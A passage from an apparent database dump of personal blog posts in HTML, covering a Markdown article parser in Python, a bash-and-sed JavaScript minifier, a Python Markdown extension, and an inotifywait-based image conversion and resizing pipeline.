    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">md</span> <span class="o">=</span> <span class="kc">None</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;articles/&#39;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span> <span class="k">as</span> <span class="n">file_contents</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">md</span> <span class="o">=</span> <span class="n">markdown</span><span class="o">.</span><span class="n">Markdown</span><span class="p">(</span>
                    <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">(),</span> <span class="s1">&#39;meta&#39;</span><span class="p">,</span> <span class="s1">&#39;fenced_code&#39;</span><span class="p">,</span> <span class="s1">&#39;codehilite&#39;</span><span class="p">,</span> <span class="s1">&#39;toc&#39;</span><span class="p">]</span>
                <span class="p">)</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="n">file_contents</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
        <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;I was not able to find the file to open&quot;</span><span class="p">)</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>

        <span class="n">id_regex</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^\d\d\d-&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">id_regex</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">id_regex</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Articles need a title&quot;</span><span class="p">)</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">make_url_from_title</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span>
        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
            <span class="k">pass</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;blurb&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;blurb&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Articles need a blurb&quot;</span><span class="p">)</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;parent&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;parent&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;parent&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;blog&#39;</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">Meta</span><span class="p">[</span><span class="s1">&#39;tags&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="nd">@staticmethod</span>
    <span class="k">def</span> <span class="nf">make_url_from_title</span><span class="p">(</span><span class="n">title</span><span class="p">):</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">title</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;\.&quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;-+&quot;</span><span class="p">,</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;-+$&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">url</span>
</pre></div>


<p>In this section of that code:</p>
<div class="codehilite"><pre><span></span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;articles/&#39;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span> <span class="k">as</span> <span class="n">file_contents</span><span class="p">:</span>
    <span class="bp">self</span><span class="o">.</span><span class="n">md</span> <span class="o">=</span> <span class="n">markdown</span><span class="o">.</span><span class="n">Markdown</span><span class="p">(</span>
        <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">(),</span> <span class="s1">&#39;meta&#39;</span><span class="p">,</span> <span class="s1">&#39;fenced_code&#39;</span><span class="p">,</span> <span class="s1">&#39;codehilite&#39;</span><span class="p">,</span> <span class="s1">&#39;toc&#39;</span><span class="p">]</span>
    <span class="p">)</span>
    <span class="bp">self</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">md</span><span class="o">.</span><span class="n">convert</span><span class="p">(</span><span class="n">file_contents</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</pre></div>


<p>I need to open a file, read the content and now because there is no longer any custom parsing, convert straight away. md provides a method <code>convertFile()</code> that could take care of this step, but it can only outout to standard out or to another file. I''ll see about time to submit a patch for that.</p>','2019-02-12 21:53:59.525385','2019-02-12 21:53:59.525385','<p>Did not read the manual and spent a few weeks writing code to handle file parsing that is totally unnecessary. Because I am an idiot. On the plus side, I get to delete code.</p>',NULL),
	 (4,'Lets make a terrible JS minifier: Part 3','lets-make-a-terrible-js-minifier-part-3','blog','<p><a href="/blog/lets-make-a-terrible-JS-minifier-pt2" title="Lets make a terrible JS minifier: Part 2">Following on from part 2</a>, I''ll show you how I integrate this in to development and deployment workflow for great good!</p>
<p>Throughout the previous examples you would have seen lines like <code>cat temp.js &gt;&gt; tmcscripts.js</code> and <code>rm temp.js</code>. These actions pretty much sum up how this all works:</p>
<ol>
<li>Copy the first file (searcher.js) to a temp file: <code>cat searcher.js &gt; temp.js</code></li>
<li>Run the viable minification on it (part 1)</li>
<li>Append (and create since first file) to tmcscripts.js <code>cat temp &gt; tmcscripts.js</code></li>
<li>Remove temp file</li>
<li>Copy the second file (video.js) to a temp file: <code>cat video.js &gt; temp.js</code></li>
<li>Run the viable minification on it (part 1)</li>
<li>Append to tmcscripts.js <code>cat temp &gt;&gt; tmcscripts.js</code></li>
<li>Remove temp file</li>
<li>Repeat for any more scripts to be minified (none ATM)</li>
<li>Perform general minification on tmcscripts.js</li>
<li>Append any files that need to be there but not (or are already) minified</li>
</ol>
<p>You will end up with this:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="ch">#!/bin/bash</span>

<span class="c1"># Combine and minify all the js files into one file to save on requests and bytes</span>

<span class="nb">cd</span> media/js <span class="c1"># Move to directory with scripts from base directory</span>

<span class="nb">echo</span> <span class="s1">&#39;Begin smooshing searcher.js&#39;</span>

<span class="c1">#  Minify the variable names.</span>
<span class="c1">#  Each script is put in its own function scope so other scripts should (in theory) have no problems with this</span>
cat searcher.js &gt; temp.js
grasp -i <span class="s1">&#39;#$noResults&#39;</span> -R z temp.js
...
sed -i <span class="s1">&#39;s/searchVal\b/n/g&#39;</span> temp.js  <span class="c1"># current bug with grasp where it cant parse 3 or more variables on the same line</span>

<span class="c1"># Function names</span>
grasp -i <span class="s1">&#39;#filter&#39;</span> -R m temp.js
...

cat temp.js &gt; myscript.js
rm temp.js

<span class="nb">echo</span> <span class="s1">&#39;Begin smooshing video.js&#39;</span>

<span class="c1"># Begin the smooshing of video.js</span>
cat video.js &gt; temp.js

grasp -i <span class="s1">&#39;#videos&#39;</span> -R z temp.js
...
grasp -i <span class="s1">&#39;#doc&#39;</span> -R zr temp.js

cat temp.js &gt;&gt; tmcscripts.js
rm temp.js

<span class="c1"># Finished with video.js</span>

<span class="nb">echo</span> <span class="s1">&#39;Finished with home brew scripts&#39;</span>
<span class="nb">echo</span> <span class="s1">&#39;Begin general minification&#39;</span>

sed -i <span class="s1">&#39;s/[^:]\/\/.*//g&#39;</span> tmcscripts.js            <span class="c1"># Dont need comments (and they become greedy when everything is on a single line). [:] is for urls (which have //)</span>
...
sed -i <span class="s1">&#39;:a;N;$!ba;s/\n//g&#39;</span> tmcscripts.js          <span class="c1"># New lines N.B. Put this at the end otherwise other operation (like get rid of leading white space) get confused</span>

<span class="nb">echo</span> <span class="s1">&#39;Finished  general minification&#39;</span>

<span class="nb">echo</span> <span class="s1">&#39;Adding in GA (unmolested)&#39;</span>
<span class="c1"># GS is already optimised and mucking with it further seems to break things so just append it at the end</span>
cat ga.js &gt;&gt; tmcscripts.js

<span class="nb">echo</span> <span class="s1">&#39;Finished with GA&#39;</span>
<span class="nb">echo</span> <span class="s1">&#39;Finished combining all JavaScript files&#39;</span>
</pre></div>
</td></tr></table>

<p>Now we have a minified file ready to be deployed and dealt with (which is another post).</p>','2014-01-12 21:51:56','2014-01-12 21:51:56','<p>Part three and penultimate post of a fun little series on minifying some JavaScript</p>',2),
	 (15,'Let''s make a terrible Markdown extension pt3 - Getting coding','lets-make-a-terrible-markdown-extension-pt3-getting-coding','blog','<p>In this page:</p>
<div class="toc">
<ul></ul>
</div>
<p>Now that we are set up to build and test the code, lets get to coding.</p>
<div class="codehilite"><pre><span></span><span class="hll"><span class="k">class</span> <span class="nc">GifV</span><span class="p">(</span><span class="n">Extension</span><span class="p">):</span>
</span>    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;video_url_base&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;//assets.themetacity.com/gifv/&#39;</span><span class="p">,</span> <span class="s1">&#39;URL of the directory the file resides in&#39;</span><span class="p">],</span>
            <span class="s1">&#39;css_class&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;gifv&#39;</span><span class="p">,</span> <span class="s1">&#39;CSS class to append to the video to identify it as a gifv&#39;</span><span class="p">]</span>
        <span class="p">}</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

<span class="hll">    <span class="k">def</span> <span class="nf">extendMarkdown</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">md</span><span class="p">,</span> <span class="n">md_globals</span><span class="p">):</span>
</span>        <span class="n">md</span><span class="o">.</span><span class="n">preprocessors</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="s1">&#39;gifv&#39;</span><span class="p">,</span> <span class="n">GifVPreprocessor</span><span class="p">(</span><span class="bp">self</span><span class="p">),</span> <span class="s1">&#39;_begin&#39;</span><span class="p">)</span>
</pre></div>


<p>Your class definition needs to extend <code>Extension</code> which will hook it into the markdown system and then needs to define a method <code>extendMarkdown</code>.</p>
<p>The init sets up the config options you can define for the extension. These can be overwritten at the time the extension is processed like so:</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">Markdown</span>
<span class="n">markdown</span><span class="o">.</span><span class="n">markdown</span><span class="p">(</span><span class="s1">&#39;Demo text&#39;</span><span class="p">,</span> <span class="n">extensions</span><span class="o">=</span><span class="p">[</span><span class="n">GifV</span><span class="p">(</span><span class="n">css_class</span><span class="o">=</span><span class="s1">&#39;other_classname&#39;</span><span class="p">)])</span>
</pre></div>


<p><code>extendMarkdown</code> is where the extension is registered in the markdown process. If your extension needs to do more than one thing, it is just a matter or registering both classes in here.</p>
<div class="codehilite"><pre><span></span>def extendMarkdown(self, md, md_globals):
    md.*.add(&#39;gifv&#39;, ClassWhereWorkHappens(self), &#39;_begin&#39;)
    md.*.add(&#39;gify&#39;, DifferentClassWhereWorkHappens(self), &#39;_begin&#39;)
</pre></div>


<p><code>md.*.add()</code> registers the class with the <code>mardown</code> process. The <code>*</code> has a few different options depending on the type of extension needed. See further in the guide.</p>
<p>The <code>_being</code> string at the end there instructs the <code>markdown</code> package as to the order which to run the extension. The order matters as some transformations will affect how others work.</p>
<p>To see the order of the added processors it is a straightforward matter to query the <code>OrdereredDict</code> they are stored in, <code>md.preprocessors</code>. The usual rules for adding them in are the same as any other <code>OrdereredDict</code>.</p>
<p>Next up is to get on with the <code>GifPreprocessor</code> class.</p>
<p><a href="lets-make-a-terrible-markdown-extension-pt2-getting-testing">On to testing.</a></p>','2017-08-26 23:01:23','2017-08-26 23:01:23','<p>Third part of making a Python Markdown extension where we write some atual code</p>',12),
	 (22,'Let''s make a terrible image processing pipeline','lets-make-a-terrible-image-processing-pipeline','blog','<p>It used to be since <a href="http://1997.webhistory.org/www.lists/www-talk.1993q1/0182.html">way back in the day</a> that if you want to put an image on a page then you put the image on the page and users be dammed if it didn''t work for their screen.
While people had previously broached the topic of media-queries it took until the early 2000''s to get an agreed up spec drafted and then more than another decade to have it formalised after enough browser buy in happened.</p>
<p>With the arrival of mobile and HTML5 the door opened again as people began to look at ways to combat Wirth''s Law slowing down user experience''s and download times.</p>
<p>Two things that emerged out of this: the <code>&lt;picture&gt;</code> tag with media queries for different resolutions and newer, more efficient image formats. Combined, users only need to download the images at the resolution they will actually use and in the most efficient format they will use. Win, win.</p>
<p>It is not all peaches and cream however as this:</p>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://example.com/logo.png&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;Example site&#39;s logo, rainbow coloured and flying high&quot;</span> <span class="na">title</span><span class="o">=</span><span class="s">&quot;See example site&#39;s page&quot;</span><span class="p">&gt;</span>
</pre></div>


<p>becomes:</p>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">picture</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">source</span> <span class="na">srcset</span><span class="o">=</span><span class="s">&quot;https://example.com/logo_274-37.webp 274w,</span>
<span class="s">    https://https://example.com/logo_160-22.webp 160w&quot;</span>
    <span class="na">sizes</span><span class="o">=</span><span class="s">&quot;(max-width: 767px) 160px,</span>
<span class="s">            274px&quot;</span>
    <span class="na">type</span><span class="o">=</span><span class="s">image/webp</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">source</span> <span class="na">srcset</span><span class="o">=</span><span class="s">&quot;https://example.com/logo_274-37.png 274w,</span>
<span class="s">    https://https://example.com/logo_160-22.png 160w&quot;</span>
    <span class="na">sizes</span><span class="o">=</span><span class="s">&quot;(max-width: 767px) 160px,</span>
<span class="s">            274px&quot;</span>
    <span class="na">type</span><span class="o">=</span><span class="s">image/png</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://example.com/logo.png&quot;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&quot;Example site&#39;s logo, rainbow coloured and flying high&quot;</span> <span class="na">title</span><span class="o">=</span><span class="s">&quot;See example site&#39;s page&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">picture</span><span class="p">&gt;</span>
</pre></div>


<p>So a bit more work needs to go into producing a page, the logistics of which are for a different article <a href="/blog/lets-make-a-terrible-markdown-extension-pt1-background">i.e</a>. I am going to go through how I automated the creation of the images that feed into the <code>srcset</code>s.</p>
<h2 id="first-things-first">First things first</h2>
<p>To make this as lazy and as efficient as possible, the solution should probably revolve around a pipeline that watches a folder, does the work and then spits it out in a known folder. No clicking, no selecting and image then pressing upload and then download a zip of the contents. No waiting till I am back online after stomping around offline for a few days.</p>
<p>Local problems, local solutions.</p>
<p><a href="https://linux.die.net/man/1/inotifywait">This screams of <code>inotifywait</code></a>.</p>
<h2 id="second-things-second">Second things second</h2>
<p>There are a few things that will need to happen in this pipeline: take in an image, convert it to the defined formats, resize it to fit the media queries, rename the files appropriately and then put them somewhere.</p>
<p>This whole process could be one giant bash script but that sounds a nightmare to write, debug and support. So taking a page out of the Unix philosophy: one function, one folder.</p>
<p>The general approach is: have a folder for the function (<code>format</code>, <code>resize</code>, <code>rename</code> etc) which can watch for input (a file written or copied in), do the next step and then push the file out to the next function. KISS.</p>
<h2 id="inotifywait"><code>inotifywait</code></h2>
<p>You can ask Linux to watch and react to a pretty comprehensive set of actions that might happen on a folder or file: running <code>inotifywait -m file</code> will output them as they come in (the ''<code>-m</code>'' is for <code>monitor</code> which is used as the program will stop after the first event otherwise).</p>
<p>This will output all the events that happen to the file or folder that is monitored.</p>
<div class="codehilite"><pre><span></span>~&gt; inotifywait -m Desktop/drop/
Setting up watches.
Watches established.
Desktop/drop/ CREATE foo.png
Desktop/drop/ OPEN foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ MODIFY foo.png
Desktop/drop/ CLOSE_WRITE,CLOSE foo.png
Desktop/drop/ OPEN,ISDIR
Desktop/drop/ ACCESS,ISDIR
Desktop/drop/ ACCESS,ISDIR
Desktop/drop/ CLOSE_NOWRITE,CLOSE,ISDIR
Desktop/drop/ OPEN,ISDIR
Desktop/drop/ ACCESS,ISDIR
Desktop/drop/ CLOSE_NOWRITE,CLOSE,ISDIR
Desktop/drop/ MOVED_FROM foo.png
</pre></div>


<p>You can see that I copied the file <code>foo.png</code> into the folder (moved has a different event <code>MOVED_TO</code>), the system opens the file, copied the content in and then closed it. The system then accessed it a bit later and finally I moved the file out.</p>
<p>The output can be formatted thusly: <code>inotifywait --format &lt;format&gt;</code></p>
<div class="codehilite"><pre><span></span>inotifywait -m Desktop/drop/ --format %w%f
Setting up watches.
Watches established.
Desktop/drop/foo.png
</pre></div>


<p>You can listen to only the events you want too: <code>inotifywait -e &lt;event[,event,...]&gt;</code></p>
<div class="codehilite"><pre><span></span>~&gt;inotifywait -m Desktop/drop/ -e moved_to
Setting up watches.
Watches established.
Desktop/drop/ MOVED_TO foo.png
</pre></div>


<p>Very handy stuff. The <code>man</code> page has the details you need.</p>
<h2 id="of-note">Of note</h2>
<p>While up the actual watches and processes is fairly straightforward at this point there are a few gotchas.</p>
<p>The <code>create</code> event does not mean the file is ready to use. For example, when the file conversion for the <code>webp</code> converter runs, it will make the new file directly where it is told (rather than a temp file in a temp folder and move it in when done). This will trigger a <code>create</code> event then start filling it with the content of the file before firing off a <code>close</code> event (<code>close_write</code> specifically). Moving a file only triggers the move event. Be aware of what you are doing and watching for.</p>
<p>Running multiple <code>inotifywait</code> from the one script gets tricky. Running it will block and wait for it to return before allowing the rest of the script to run. You will need to run it in the background (<code>&amp;</code>).</p>
<h2 id="get-on-with-it-already">Get on with it already.</h2>
<h3 id="entry">Entry</h3>
<p>To get files into the process, the easiest way would be to watch a known folder, take the files dumped and then put them into the next step. Not much to this one.</p>
<div class="codehilite"><pre><span></span>inotifywait -m &lt;watched_folder&gt; -q --format <span class="s1">&#39;%w%f&#39;</span> -e close_write,moved_to <span class="p">|</span> <span class="se">\</span>
    <span class="k">while</span> <span class="nb">read</span> file<span class="p">;</span> <span class="k">do</span>
        cp <span class="si">${</span><span class="nv">file</span><span class="si">}</span> finished <span class="c1"># Original file</span>
        mv <span class="si">${</span><span class="nv">file</span><span class="si">}</span> formatter/drop
    <span class="k">done</span>
</pre></div>


<p>As mentioned previously, we are watching for files both copied in and also moved in. Formatter is the next step in the process. The <code>cp</code> line takes the original file and copies it to the end of the process as an unmolested original, the dropped file then enters into the formatting process.</p>
<h3 id="formatter">Formatter</h3>
<div class="codehilite"><pre><span></span><span class="nv">formats</span><span class="o">=</span><span class="k">$(</span>find . -type d -not -path . -not -path ./drop -not -path ./finished<span class="k">)</span>

inotifywait -m drop -q --format <span class="s1">&#39;%w%f&#39;</span> -e moved_to <span class="p">|</span> <span class="se">\</span>
    <span class="k">while</span> <span class="nb">read</span> file<span class="p">;</span> <span class="k">do</span>
        <span class="k">while</span> <span class="nb">read</span> -r dir<span class="p">;</span> <span class="k">do</span>
            cp <span class="si">${</span><span class="nv">file</span><span class="si">}</span> <span class="si">${</span><span class="nv">dir</span><span class="si">}</span>
        <span class="k">done</span> <span class="o">&lt;&lt;&lt;</span> <span class="si">${</span><span class="nv">formats</span><span class="si">}</span>
        cp <span class="si">${</span><span class="nv">file</span><span class="si">}</span> ../resizer/drop <span class="c1"># need to convert original format too</span>
        rm <span class="si">${</span><span class="nv">file</span><span class="si">}</span>
</pre></div>


<p>There are several folders here that need to be looked at:</p>
<div class="codehilite"><pre><span></span>converter_flif.sh  drop     finished     flif    webp
converter_webp.sh  drop.sh  finished.sh  run.sh
</pre></div>


<p>The drop and finished (and their <code>.sh</code> contemporaries) are just the entry and exit points to the step. The others are the ones that do the work. Each is a format that gets converted to. It is assumed that <code>jpg</code>s do not get converted to <code>png</code>s and vice-a-versa (so no folder for them). While <code>webp</code> will consume most anything you can throw at it, <code>flif</code> is not nearly so mature and will only do <code>png</code>''s (and other vector image types) at time of writing. <code>jpg</code>s will still end up in the folder, but the conversion will fail and there will be no output.</p>
<div class="codehilite"><pre><span></span><span class="c1"># Relying on silently swallowing errors as to weather or not the conversion was a success</span>
<span class="c1"># Currently only PNG are supported. JPGs will just be swallowed.</span>

<span class="k">if</span> <span class="o">[[</span> ! -d flif <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    mkdir flif
<span class="k">fi</span>

inotifywait -m flif -q --format <span class="s1">&#39;%f&#39;</span> -e close_write <span class="p">|</span> <span class="se">\</span>
    <span class="k">while</span> <span class="nb">read</span> file<span class="p">;</span> <span class="k">do</span>
        flif flif/<span class="si">${</span><span class="nv">file</span><span class="si">}</span> ../finished/<span class="si">${</span><span class="nv">file</span><span class="p">%.*</span><span class="si">}</span>.flif <span class="p">&amp;</span>&gt; /dev/null
        rm flif/<span class="si">${</span><span class="nv">file</span><span class="si">}</span>
    <span class="k">done</span>
</pre></div>


<p>Due to the ability for flif to only download the data needed to show well at the required size, this output goes directly to finished. The other(s) go to the <code>resize</code> step.</p>
<aside>You will see this pattern of watching a drop folder and coping it to a finished folder which moves it to the next folder a lot. It seems to work quite well.</aside>

<h3 id="resizer">Resizer</h3>
<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nb">source</span> ../functions.sh

<span class="nv">size_folders</span><span class="o">=</span><span class="k">$(</span>find . -type d -not -path . -not -path ./drop -not -path ./finished<span class="k">)</span>

inotifywait -m -q -r <span class="si">${</span><span class="nv">size_folders</span><span class="si">}</span> --format <span class="s1">&#39;%w%f&#39;</span> -e close_write <span class="p">|</span> <span class="se">\</span>
    <span class="k">while</span> <span class="nb">read</span> found_file<span class="p">;</span> <span class="k">do</span>
        <span class="nv">file_name</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="si">${</span><span class="nv">found_file</span><span class="si">}</span> <span class="p">|</span> rev <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> rev <span class="p">|</span> cut -d <span class="s1">&#39;.&#39;</span> -f <span class="m">1</span><span class="k">)</span>
